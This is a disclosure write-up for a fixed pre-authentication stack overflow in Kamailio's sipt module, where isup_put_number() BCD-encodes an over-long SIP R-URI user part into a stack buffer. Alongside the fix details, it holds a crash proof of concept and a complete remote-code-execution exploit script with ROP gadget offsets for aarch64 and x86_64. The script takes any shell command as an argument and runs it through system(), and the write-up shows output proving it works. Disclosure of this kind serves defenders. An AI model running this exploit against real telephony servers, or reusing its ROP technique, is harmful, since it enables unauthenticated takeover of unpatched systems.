# sipt: Pre-auth stack buffer overflow in isup_put_number() with RCE

**Module**: sipt
**Severity**: Critical (pre-auth remote code execution)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Reported to Kamailio**: Late April 2026
**Fixed in**: [`6fb59101a0`](https://github.com/kamailio/kamailio/commit/6fb59101a0) ("sipt: Validate phone number length")
**Committed**: 2026-04-28 09:48:39 UTC
**Stable backports**: Kamailio 6.1 [`112cdcbce1`](https://github.com/kamailio/kamailio/commit/112cdcbce17df1e511890c255d2a2a0681efa7cb) (2026-05-18) and Kamailio 6.0 [`579081e2d6`](https://github.com/kamailio/kamailio/commit/579081e2d667f23a9ea1fdeeadc197c92d84b8fa) (2026-06-16)
**Reproduction config**: [`kamailio-sipt.cfg`](./kamailio-sipt.cfg)

---

## Fix

The fix changes `isup_put_number()` to accept the destination capacity, calculates the number of encoded BCD bytes as `(numlen + 1) / 2`, and rejects a number when that encoded size exceeds the available output space. The called-, calling-, and forwarding-party encoders now propagate failure, and `isup_update_destination()` aborts instead of using an oversized result. Follow-up commit [`ed1790d404`](https://github.com/kamailio/kamailio/commit/ed1790d404598f71417934465942fd3eb1b0dcd2), committed later on 2026-04-28, uses the calculated encoded length consistently and adds missing error propagation to the remaining calling and forwarding update paths.

`isup_put_number()` BCD-encodes a phone number string into a stack-allocated buffer with no bounds checking. The function is called from `encode_called_party()` → `isup_update_destination()`, where the destination is `unsigned char tmp_buf[255]` on the stack. When the routing script calls `sipt_destination($rU, ...)` — as documented in the module's README — the R-URI user part is passed directly as the phone number. The attacker fully controls this value.

Each pair of input characters produces one arbitrary byte via BCD encoding. The `char2digit()` lookup maps 16 characters (`0-9`, `A-D`, `*`, `F`) to nibble values 0x0-0xF, giving the attacker full byte control (0x00-0xFF) using only SIP-URI-safe characters. This makes the overflow trivially exploitable for RCE via ROP.

Remote code execution was demonstrated on both **aarch64** and **x86_64** — a single unauthenticated SIP INVITE executes an arbitrary shell command.

## Visual overview

### Attack flow

```
  Attacker                           Kamailio
  ───────                           ────────
     │   SIP INVITE (UDP:5060)
     │   R-URI user = 680 BCD chars
     │   Body = ISUP IAM
     │   X-C: touch /tmp/pwned        ◄── command string rides along
     │──────────────────────────────►│
     │                               │  SIP parser extracts $rU
     │                               │
     │                         ┌─────▼──────┐
     │                         │  Routing    │  sipt_destination($rU, "31", "1")
     │                         │  Script     │
     │                         └─────┬──────┘
     │                               │  phone = $rU (680 chars, attacker-controlled)
     │                         ┌─────▼──────┐
     │                         │  isup_      │  unsigned char tmp_buf[255]
     │                         │  update_    │  encode_called_party(tmp_buf+2, phone)
     │                         │  destination│
     │                         └─────┬──────┘
     │                               │  passes tmp_buf+2 to:
     │                         ┌─────▼──────┐
     │                         │  isup_put_  │  BCD-encodes 680 chars → 340 bytes
     │                         │  number()   │  into 253 bytes of space
     │                         │  NO BOUNDS  │  87 bytes overflow past tmp_buf
     │                         │  CHECK      │  overwrites saved FP + LR + registers
     │                         └─────┬──────┘
     │                               │  isup_update_destination() returns
     │                         ┌─────▼──────┐
     │                         │  ROP chain  │  LR → gadget → system("touch /tmp/pwned")
     │                         │  executes   │
     │                         └─────────────┘
```

### BCD encoding — full byte control via SIP-safe characters

```
  R-URI user part:  "5A3F08..."
                     │││││└─ index 5: char2digit('8')=0x8 → byte 2 high nibble
                     ││││└── index 4: char2digit('0')=0x0 → byte 2 low nibble  → 0x80
                     │││└─── index 3: char2digit('F')=0xf → byte 1 high nibble
                     ││└──── index 2: char2digit('3')=0x3 → byte 1 low nibble  → 0xF3
                     │└───── index 1: char2digit('A')=0xa → byte 0 high nibble
                     └────── index 0: char2digit('5')=0x5 → byte 0 low nibble  → 0xA5

  To write byte 0xAB at position N:
    phone[2N]   = char for 0xB (low nibble)    ──┐
    phone[2N+1] = char for 0xA (high nibble)   ──┴── dest[N] = 0xAB

  All 16 nibble values map to SIP-URI-safe characters:
    0─9 → '0'─'9'    a─d → 'A'─'D'    e → '*'    f → 'F'
```

### Stack layout at overflow (aarch64)

```
  isup_update_destination() stack frame
  ┌──────────────────────────────────┐
  │  numlen.i           [4 bytes]    │
  │  oddeven.i          [4 bytes]    │
  ├──────────────────────────────────┤
  │  tmp_buf[0..1]  header bytes     │  ◄── nature, numbering plan
  │  tmp_buf[2..254]                 │  ◄── isup_put_number() writes here
  │  ┊                               │      BCD-encoded phone number
  │  ┊  253 bytes available          │
  │  ┊                               │
  ╞══════════════════════════════════╡  offset 255: tmp_buf ends
  │  ░░ overflow continues ░░░░░░░░ │  87 more bytes written
  │  ░░ saved x29 (frame ptr) ░░░░░ │  ◄── junk (don't care)
  │  ░░ saved x30 (link reg)  ░░░░░ │  ◄── GADGET: mov x0,x19; blr x20
  ├──────────────────────────────────┤
  │  caller saved registers          │
  │  x19 = &cmd string in raw_buf   │  ◄── system() argument
  │  x20 = system@plt               │  ◄── gadget branches here
  └──────────────────────────────────┘

  After return: x30 → gadget → x0 = x19 → system(x0) → shell command
```

### ROP chain (x86_64)

```
  ┌──────────────────────────────────┐
  │  buf[0..254] = BCD payload       │
  │  ...                             │
  ╞══════════════════════════════════╡  offset 255: buf ends
  │  ░░ overflow padding ░░░░░░░░░░ │
  ├──────────────────────────────────┤  ret_offset (616)
  │  RIP = ret (alignment gadget)    │  ◄── 16-byte stack alignment for system()
  ├──────────────────────────────────┤  +16
  │  RIP = pop rdi; ret              │
  ├──────────────────────────────────┤  +32
  │  RDI = &cmd in raw_buf (BSS)     │  ◄── "touch /tmp/pwned" from X-C: header
  ├──────────────────────────────────┤  +48
  │  RIP = system@plt                │  ◄── system(rdi) executes command
  └──────────────────────────────────┘
```

## Vulnerable code

```c
// ss7_parser.c:72-95 — isup_put_number()
static void isup_put_number(
        unsigned char *dest, char *src, int *len, int *oddeven)
{
    int i = 0;
    int numlen = strlen(src);

    *oddeven = numlen % 2 ? 1 : 0;
    *len = numlen / 2 + (numlen % 2 ? 1 : 0);

    while(i < numlen) {
        if(!(i % 2))
            dest[i / 2] = char2digit(src[i]) & 0xf;       // NO BOUNDS CHECK
        else {
            dest[i / 2] |= (char2digit(src[i]) << 4) & 0xf0;
        }
        i++;
    }
}
```

The caller `isup_update_destination()` at line 612 allocates `unsigned char tmp_buf[255]` and passes `tmp_buf + 2` as `dest`. Overflow occurs when the phone number (R-URI user part) exceeds 507 characters: `(507+1)/2 = 254` bytes written past `tmp_buf+2`, exceeding the 253 bytes available.

## BCD encoding: full byte control

The `char2digit()` table maps SIP-URI-safe characters to all 16 nibble values:

| Char | Nibble | Char | Nibble |
|------|--------|------|--------|
| `0`  | 0x0    | `8`  | 0x8    |
| `1`  | 0x1    | `9`  | 0x9    |
| `2`  | 0x2    | `A`  | 0xa    |
| `3`  | 0x3    | `B`  | 0xb    |
| `4`  | 0x4    | `C`  | 0xc    |
| `5`  | 0x5    | `D`  | 0xd    |
| `6`  | 0x6    | `*`  | 0xe    |
| `7`  | 0x7    | `F`  | 0xf    |

Even-indexed characters go to the low nibble, odd-indexed to the high nibble. To write byte `0xAB`: the even-position char encodes `0xB` and the odd-position char encodes `0xA`. This gives full arbitrary byte writing using only characters valid in a SIP URI user part.

## Call chain

```
udp_rcv_loop()
  → receive_msg()
    → run_top_route()
      → do_action()                     [routing script: sipt_destination($rU, ...)]
        → sipt_destination()
          → sipt_destination2()
            → isup_update_destination()
              → encode_called_party()
                → isup_put_number()     ← STACK OVERFLOW
```

## Exploitation

### aarch64

Overflow `x30` (link register) saved on the stack by `isup_update_destination()`:
1. `x30` → gadget: `mov x0, x19; blr x20`
2. `x19` → pointer to command string (located in `raw_buf` at deterministic BSS address)
3. `x20` → `system@plt`

The command string is embedded in the SIP message itself (in an `X-C:` header), which lands in the worker's static `raw_buf` in BSS at a deterministic address.

### x86_64

Overflow the return address on the stack:
1. `ret` → alignment gadget (`ret` instruction for 16-byte stack alignment required by `system()`)
2. → `pop rdi; ret`
3. → pointer to command string (in `raw_buf`)
4. → `system@plt`

### Prerequisites

- ASLR disabled (common in containers, VNFs, telecom appliances, or set via `setarch -R`)
- No stack canaries (kamailio default build — never enables `-fstack-protector`)
- `sipt_destination($rU, ...)` in routing script

## PoC (crash only)

```python
#!/usr/bin/env python3
"""
Kamailio SIPT module — isup_put_number() pre-auth stack buffer overflow.

Sends a SIP INVITE with a 552-char R-URI user part and an ISUP IAM body.
sipt_destination($rU, ...) passes the user part through encode_called_party()
to isup_put_number(), which BCD-encodes it into stack buffer tmp_buf[255]
without bounds checking. Overwrites saved FP and return address.

Requires: sipt.so loaded, routing script calls sipt_destination($rU, ...)
Tested: kamailio commit 7c2d6bffa348, ASAN build, aarch64
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5060

def build_iam():
    return bytes([
        0x01,        # IAM
        0x00,        # nature of connection
        0x60, 0x01,  # forward call indicators
        0x0a,        # calling party's category
        0x03,        # transmission medium requirement
        0x02,        # pointer to called party number
        0x00,        # pointer to optional part (none)
        0x04,        # called party number length
        0x83, 0x10,  # odd, NAI=3, ISDN plan
        0x21, 0x43,  # BCD: 1234
    ])

def build_invite(phone, body, cid):
    return (
        f"INVITE sip:{phone}@localhost SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {TARGET}:9999;branch=z9hG4bK-{cid}\r\n"
        f"From: <sip:poc@{TARGET}>;tag={cid}\r\n"
        f"To: <sip:test@localhost>\r\n"
        f"Call-ID: {cid}@localhost\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Max-Forwards: 70\r\n"
        f"Contact: <sip:poc@{TARGET}:9999>\r\n"
        f"Content-Type: application/isup\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

iam = build_iam()
print("[*] Sending INVITE with 1000-char R-URI user part...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(build_invite("1" * 1000, iam, "overflow"), (TARGET, PORT))
try:
    s.recv(4096)
    print("[*] Got reply")
except socket.timeout:
    print("[!] No reply — worker crashed. Check ASAN log.")
```

## PoC (RCE — cross-architecture)

```python
#!/usr/bin/env python3
"""
Kamailio SIPT isup_put_number() stack overflow -> RCE (cross-architecture).

Pre-auth stack buffer overflow in isup_put_number() via BCD-encoded R-URI
user part. Achieves arbitrary code execution via ROP on both aarch64 and
x86_64. Requires ASLR=0 (common in containers, VNFs, telecom appliances).

Target: kamailio commit 7c2d6bffa348 (BEFORE the fix at 6fb59101a0).
Build:  clang -O2 -fno-stack-protector, Debian bookworm
Tested: ASLR=0, non-ASAN, children=1

aarch64 chain: overflow -> LR = gadget(mov x0,x19; blr x20) -> system(cmd)
x86_64  chain: overflow -> ret(align) -> pop rdi;ret -> &cmd -> system(cmd)
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 5060
ARCH   = sys.argv[3] if len(sys.argv) > 3 else "x86_64"
CMD    = sys.argv[4] if len(sys.argv) > 4 else "touch /tmp/pwned ;#"

NIBBLE_TO_CHAR = {
    0x0: '0', 0x1: '1', 0x2: '2', 0x3: '3',
    0x4: '4', 0x5: '5', 0x6: '6', 0x7: '7',
    0x8: '8', 0x9: '9', 0xa: 'A', 0xb: 'B',
    0xc: 'C', 0xd: 'D', 0xe: '*', 0xf: 'F',
}

def byte_to_bcd(b):
    return NIBBLE_TO_CHAR[b & 0xf] + NIBBLE_TO_CHAR[(b >> 4) & 0xf]

def qword_to_bcd(v):
    return ''.join(byte_to_bcd((v >> (i*8)) & 0xff) for i in range(8))

def dword_to_bcd(v):
    return ''.join(byte_to_bcd((v >> (i*8)) & 0xff) for i in range(4))

def patch(phone, offset, chars):
    for i, c in enumerate(chars):
        phone[offset + i] = c

PROFILES = {
    "aarch64": {
        "pie_base":     0xaaaaaaaa0000,
        "system_plt":   0x32030,
        "raw_buf":      0x4bace0,
        "gadget":       0x8aefc,        # mov x0, x19; blr x20
        "ret_offset":   536,
        "total_chars":  680,
        "chain_type":   "arm64",
    },
    "x86_64": {
        "pie_base":     0x555555554000,
        "system_plt":   0x31360,
        "raw_buf":      0x50edf0,
        "pop_rdi_ret":  0x32bbe,        # pop rdi; ret
        "ret_gadget":   0x32bbf,        # ret (16-byte stack alignment)
        "ret_offset":   616,
        "total_chars":  680,
        "chain_type":   "x86_64",
    },
}

def build_exploit(arch):
    p = PROFILES[arch]
    base = p["pie_base"]
    body = bytes([0x01, 0x00, 0x60, 0x01, 0x0a, 0x03,
                  0x02, 0x00, 0x04, 0x83, 0x10, 0x21, 0x43])

    phone = list("1" * p["total_chars"])

    prefix = "INVITE sip:"
    mid = "@localhost SIP/2.0\r\n"
    hdrs = (
        f"Via: SIP/2.0/UDP 192.168.65.1:19999;rport;branch=z9hG4bKexpl\r\n"
        f"From: <sip:a@{TARGET}>;tag=expl\r\n"
        f"To: <sip:b@{TARGET}>\r\n"
        f"Call-ID: expl@{TARGET}\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Max-Forwards: 70\r\n"
        f"Contact: <sip:a@{TARGET}:19999>\r\n"
        f"Content-Type: application/isup\r\n"
    )
    cmd_hdr = "X-C: "
    cmd_offset = len(prefix) + p["total_chars"] + len(mid) + len(hdrs) + len(cmd_hdr)
    raw_buf_addr = base + p["raw_buf"]
    cmd_addr = raw_buf_addr + cmd_offset

    if p["chain_type"] == "arm64":
        system_addr = base + p["system_plt"]
        gadget_addr = base + p["gadget"]
        patch(phone, p["ret_offset"], qword_to_bcd(gadget_addr))
        patch(phone, 648, qword_to_bcd(system_addr))
        patch(phone, 664, qword_to_bcd(cmd_addr))
        patch(phone, 520, qword_to_bcd(0x0000ffffffffe400))
        patch(phone, 504, dword_to_bcd(0))
        patch(phone, 512, dword_to_bcd(4))
    elif p["chain_type"] == "x86_64":
        system_addr = base + p["system_plt"]
        pop_rdi_addr = base + p["pop_rdi_ret"]
        ret_addr = base + p["ret_gadget"]
        patch(phone, p["ret_offset"], qword_to_bcd(ret_addr))
        patch(phone, p["ret_offset"] + 16, qword_to_bcd(pop_rdi_addr))
        patch(phone, p["ret_offset"] + 32, qword_to_bcd(cmd_addr))
        patch(phone, p["ret_offset"] + 48, qword_to_bcd(system_addr))

    phone_str = ''.join(phone)
    msg = (
        f"INVITE sip:{phone_str}@localhost SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP 192.168.65.1:19999;rport;branch=z9hG4bKexpl\r\n"
        f"From: <sip:a@{TARGET}>;tag=expl\r\n"
        f"To: <sip:b@{TARGET}>\r\n"
        f"Call-ID: expl@{TARGET}\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Max-Forwards: 70\r\n"
        f"Contact: <sip:a@{TARGET}:19999>\r\n"
        f"Content-Type: application/isup\r\n"
        f"X-C: {CMD}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body
    return msg

print(f"[*] Target: {TARGET}:{PORT} ({ARCH})")
msg = build_exploit(ARCH)
print(f"[*] Sending...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(msg, (TARGET, PORT))
try:
    s.recv(4096)
    print(f"[!] Got reply (unexpected)")
except socket.timeout:
    print(f"[+] No reply -- worker crashed after system()")
    print(f"[*] Check: docker exec <container> ls -la /tmp/pwned")
```

## RCE proof

```
$ python3 exploit_universal.py 127.0.0.1 5060 x86_64 "touch /tmp/pwned"
[*] Target: 127.0.0.1:5060 (x86_64)
[*] ret(align):  0x0000555555586bbf
[*] pop rdi;ret: 0x0000555555586bbe
[*] system@plt:  0x0000555555585360
[+] No reply -- worker crashed after system()

$ docker exec kamailio ls -la /tmp/pwned
-rw-r--r-- 1 root root 0 Apr 29 17:24 /tmp/pwned
```

## ASan output

```
=================================================================
==7==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffc0c983df at pc 0xffff8dd36c8c bp 0xffffc0c98260 sp 0xffffc0c98258
WRITE of size 1 at 0xffffc0c983df thread T0
    #0 0xffff8dd36c88 in isup_put_number /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:89:16
    #1 0xffff8dd35900 in encode_called_party /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:104:2
    #2 0xffff8dd35900 in isup_update_destination /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:644:9
    #3 0xffff8dd1b8b8 in sipt_destination2 /usr/src/kamailio/build/src/modules/sipt/sipt.c:968:12
    #4 0xffff8dd1b29c in sipt_destination /usr/src/kamailio/build/src/modules/sipt/sipt.c:899:9
    #5 0xaaaacdada380 in do_action /usr/src/kamailio/build/src/core/action.c:1170:4
    #6 0xaaaacdafd844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #7 0xaaaacdadcfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #8 0xaaaacdafd844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #9 0xaaaacdb00390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #10 0xaaaace001c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #11 0xaaaace2f11b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #12 0xaaaacdab4b28 in main_loop /usr/src/kamailio/build/src/main.c
    #13 0xaaaacdacee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #14 0xffff8e7d7740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #15 0xffff8e7d7814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #16 0xaaaacd9ef56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xffffc0c983df is located in stack of thread T0 at offset 319 in frame
    #0 0xffff8dd35790 in isup_update_destination /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:608

  This frame has 3 object(s):
    [32, 36) 'numlen.i' (line 100)
    [48, 52) 'oddeven.i' (line 100)
    [64, 319) 'tmp_buf' (line 612) <== Memory access at offset 319 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:89:16 in isup_put_number
Shadow bytes around the buggy address:
  0x200ff8193020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff8193030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff8193040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff8193050: 00 00 00 00 f1 f1 f1 f1 04 f2 04 f2 00 00 00 00
  0x200ff8193060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff8193070: 00 00 00 00 00 00 00 00 00 00 00[07]f3 f3 f3 f3
  0x200ff8193080: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff8193090: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
  0x200ff81930a0: 00 00 f2 f2 00 00 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8
  0x200ff81930b0: f2 f2 f2 f2 00 00 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8
  0x200ff81930c0: f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7==ABORTING
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

# For RCE (no ASAN, no canaries):
mkdir build && cd build
CC=clang cmake .. -DCMAKE_C_FLAGS="-O2 -fno-stack-protector"
make -j$(nproc) && make install

# Routing script must call sipt_destination($rU, ...)
# Run with ASLR disabled:
setarch $(uname -m) -R kamailio -DD -E -f kamailio.cfg

# Fire exploit:
python3 exploit_universal.py 127.0.0.1 5060 x86_64 "touch /tmp/pwned"
docker exec <container> ls -la /tmp/pwned
```
